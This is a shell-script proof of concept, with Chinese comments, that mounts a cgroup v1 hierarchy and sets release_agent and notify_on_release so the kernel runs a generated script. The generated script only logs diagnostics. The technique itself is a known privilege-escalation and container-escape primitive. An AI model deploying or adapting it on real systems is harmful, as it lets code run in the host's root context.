#!/bin/sh -e



# cgroup-v1-release-agent-run: 滥用 cgroup v1 notify_on_release 机制运行特定程序的 PoC
# xxxxxliil@github 于 2021-05-06 09:17 时成功在学校运行 Windows 的电脑里用 VirtualBox 运行的 Arch 手动触发 cgroup v1 的 notify_on_release 机制，随后写了这个 PoC
#更：stat(1) 说这个人在 2021-05-06 10:13:19 初步完成
#stat: 最近更改：2021-05-06 10:13:19



CGV1_RARUN_BASE_DIR='/dev'
CGV1_RARUN_NAME='nosubsys-cgv1'
CGV1_RARUN_MOUNT_PATH="${CGV1_RARUN_BASE_DIR}/${CGV1_RARUN_NAME}"
CGV1_RARUN_MOUNT_OPTIONS="${CGV1_RARUN_NAME},none,nodev,noexec,nosuid,relatime"
CGV1_RARUN_TRIGGER_NODE_PATH_NAME="${CGV1_RARUN_NAME}-run"
CGV1_RARUN_TRIGGER_VERIFY_FILE="${CGV1_RARUN_BASE_DIR}/cgv1-rarun.ok"

ALWAYS_CLEAN="false"
BUT_I_USING_OLD_ANDROID="false"
MAKE_RUN_PROG_PATH="true"
PS="ps -wwef"
SHEBANG="#!/bin/sh"
RUN_PROG_PATH="${CGV1_RARUN_BASE_DIR}/${CGV1_RARUN_TRIGGER_NODE_PATH_NAME}.sh"

clean(){
    rmdir "${CGV1_RARUN_MOUNT_PATH}/${CGV1_RARUN_TRIGGER_NODE_PATH_NAME}"
    umount "${CGV1_RARUN_MOUNT_PATH}" && rmdir "${CGV1_RARUN_MOUNT_PATH}"
    rm -f "${CGV1_RARUN_TRIGGER_VERIFY_FILE}"
}


if [ "${MAKE_RUN_PROG_PATH}" = 'true' ]; then
    if [ "${BUT_I_USING_OLD_ANDROID}" = 'true' ]; then
        CGV1_RARUN_MOUNT_OPTIONS="${CGV1_RARUN_MOUNT_OPTIONS%,relatime*}"
        PS='ps'
        SET_PATH="PATH=${PATH}; export PATH"
        SHEBANG="#!/system/bin/sh"
        android_addon_1='(
    exec >/dev/cgv1rr-pre.out;
    ls -aZl /proc/self/fd;
    ls -aZl /proc/$$/; ls -aZl /proc/$$/fd; echo $$;
    ls -aZl /proc/$PPID/; ls -aZl /proc/$PPID/fd; ls -al /proc/$PPID/fdinfo; echo $PPID;
    busybox ps -o user,group,pid,ppid,pgid,rgroup,stat,sid,args;
)'
        android_addon_2='ls -aZl /proc/$$/
for i in $(ls /proc/$$/attr);do
    echo "$i: $(cat /proc/$$/attr/$i)"
done
ls -aZl /proc/$$/fd'
    fi
    cat > "${RUN_PROG_PATH}" <<-EOF
${SHEBANG}



# 我知道这里充满了 anti-pattern，但是我没有办法解决它

${SET_PATH}
${android_addon_1}

exec >/dev/cgv1-rarun.sh.out
exec 2>/dev/cgv1-rarun.sh.err

echo "Welcome to using base on cgroup v1's PoC: cgroup v1 release run!!!"
echo "Welcome to using base on cgroup v1's PoC: cgroup v1 release run!!!(With stderr)" >&2

${PS}

echo "args: \${@}"
echo "env: "
set

touch /dev/cgv1-rarun.ok
${android_addon_2}

sleep 9999
EOF
    chmod 0755 "${RUN_PROG_PATH}"
fi
echo "run ${RUN_PROG_PATH}"

# 不检查 uid，为了可能的 uid != 0  但拥有 CAP_SYSADMIN 进程
[ ! -d "${CGV1_RARUN_MOUNT_PATH}" ] && mkdir -p "${CGV1_RARUN_MOUNT_PATH}"
mount | grep "^${CGV1_RARUN_NAME}" >/dev/null 2>&1 || {
    mount -o "name=${CGV1_RARUN_MOUNT_OPTIONS}" -t cgroup \
        "${CGV1_RARUN_NAME}" "${CGV1_RARUN_MOUNT_PATH}" ||
        { echo "[FAIL]: Can't mount cgroup node" >&2; exit 1; }
}


#我不知道 Linux Kernel 会不会一直执行它，反正我不认为用这玩意当服务管理器是什么好主意，相反，这很坏
#^: 指会不会有执行时间限制
echo "${RUN_PROG_PATH}" >"${CGV1_RARUN_MOUNT_PATH}/release_agent"


echo 1 >"${CGV1_RARUN_MOUNT_PATH}/notify_on_release"
mkdir -p "${CGV1_RARUN_MOUNT_PATH}/${CGV1_RARUN_TRIGGER_NODE_PATH_NAME}"

#写入一个转瞬即逝的进程就好
agent_run_failed='false'
sh -c "echo \$\$ > ${CGV1_RARUN_MOUNT_PATH}/${CGV1_RARUN_TRIGGER_NODE_PATH_NAME}/cgroup.procs"
until [ -f "${CGV1_RARUN_TRIGGER_VERIFY_FILE}" ]; do
    count=$((${count:=0}+1)); sleep 0.25
    [ ${count} = 7 ] && agent_run_failed='true' && break
done

if [ ${agent_run_failed} = 'true' ]; then
    echo "[FAIL] Please check the SELinux rules or capability!!!" >&2
    [ "${ALWAYS_CLEAN}" = 'true' ] && clean; exit 1
else
    echo "Welcome to using base on cgroup v1's PoC: meta cgroup run!!!"
    clean
fi
